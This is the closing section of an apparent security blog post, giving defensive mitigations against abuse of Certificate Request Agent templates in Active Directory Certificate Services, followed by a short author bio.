<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnbsPCOzoR1ba2NdzE58u_DaKRc_CVm0OnPWZyoiCgSxsEaNseqVyfPjKSuP7Lp1jVGsRIPjiyQRJcFRovRmyz0Gt7cXGttcnxLbQ2eBPb0FzNC5vmuxXefSwrZK4OKhLb3VjuB01jLkpXHKjeVHJTGYFo7uSipgkGqOL-FOa7fW1bMGqIXMhKiTymueYb/s16000/23.png"/></span></p>
<h3><span style="color: #800000;"> Mitigation</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Restrict Certificate Request Agent EKU Usage</strong> → Only assign to dedicated agent templates used by trusted PKI personnel</span></li>
<li><span style="color: #000000;"><strong>Require Certificate Manager Approval</strong> → Ensure all templates with the Agent EKU need manual approval before certificate issuance</span></li>
<li><span style="color: #000000;"><strong>Limit Enrollment Permissions</strong> → Grant Enroll/Autoenroll rights only to trusted users/groups, not to Domain Users</span></li>
<li><span style="color: #000000;"><strong>Audit Existing Templates for EKU Risk</strong> → Use toolslike  Certipy to identify templates with 1.3.6.1.4.1.311.20.2.1</span></li>
<li><span style="color: #000000;"><strong>Monitor for Abuse &amp; Impersonation</strong> → Log and alert on Event IDs 4886 (request) and 4887 (issued); flag on-behalf-of activity</span></li>
<li><span style="color: #000000;"><strong>Harden CA Infrastructure</strong> → Remove unused roles (e.g., Web Enrollment), apply patches, and isolate CA servers with strong ACLs and network controls</span></li>
</ul>
<p><span style="color: #000000;"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
